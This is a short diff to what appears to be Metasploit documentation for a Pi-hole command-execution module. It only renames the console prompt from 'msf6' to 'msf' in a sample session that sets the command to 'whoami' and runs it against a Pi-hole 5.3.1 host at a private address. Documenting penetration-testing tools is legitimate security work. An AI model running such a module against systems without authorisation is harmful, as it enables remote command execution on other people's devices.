@@ -73,9 +73,9 @@ resource (pihole.rb)> run
 [*] Forcing gravity pull
 [+] /var/www/html/admin/scripts/pi-hole/php
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/pihole_domains_api_exec) > set command whoami
+msf auxiliary(admin/http/pihole_domains_api_exec) > set command whoami
 command => whoami
-msf6 auxiliary(admin/http/pihole_domains_api_exec) > run
+msf auxiliary(admin/http/pihole_domains_api_exec) > run
 [*] Running module against 192.168.2.199
 
 [+] Web Interface Version Detected: 5.3.1
